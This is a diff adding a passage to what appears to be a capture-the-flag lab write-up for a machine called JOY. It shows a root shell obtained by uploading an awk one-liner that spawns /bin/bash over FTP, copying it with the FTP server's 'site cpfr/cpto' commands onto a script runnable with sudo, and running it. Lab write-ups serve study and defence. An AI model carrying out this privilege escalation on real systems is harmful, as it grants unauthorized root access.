@@ -388,3 +388,38 @@ document-generator.sh  dovecot.csr  permissions.sh  rootCA.key	rootCA.srl
 cat proof.txt
 Never grant sudo permissions on scripts that perform system functions!
 
+
+\\use ftp site to change test file to lauch root shell
+└─$ echo "awk 'BEGIN {system(\"/bin/bash\")}'" > test
+
+─$ cat test
+awk 'BEGIN {system("/bin/bash")}'
+
+ftp> cd upload
+250 CWD command successful
+ftp> put test
+local: test remote: test
+229 Entering Extended Passive Mode (|||2492|)
+150 Opening BINARY mode data connection for test
+100% |**************************************************************************|    34      442.70 KiB/s    00:00 ETA
+226 Transfer complete
+34 bytes sent in 00:00 (25.26 KiB/s)
+ftp> quit
+221 Goodbye.
+
+─$ telnet 192.168.56.132 21
+Trying 192.168.56.132...
+Connected to 192.168.56.132.
+Escape character is '^]'.
+220 The Good Tech Inc. FTP Server
+site cpfr /home/ftp/upload/test
+350 File or directory exists, ready for destination name
+site cpto /home/patrick/script/test
+250 Copy successful
+
+patrick@JOY:~$ sudo /home/patrick/script/test
+sudo /home/patrick/script/test
+root@JOY:/home/patrick# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+
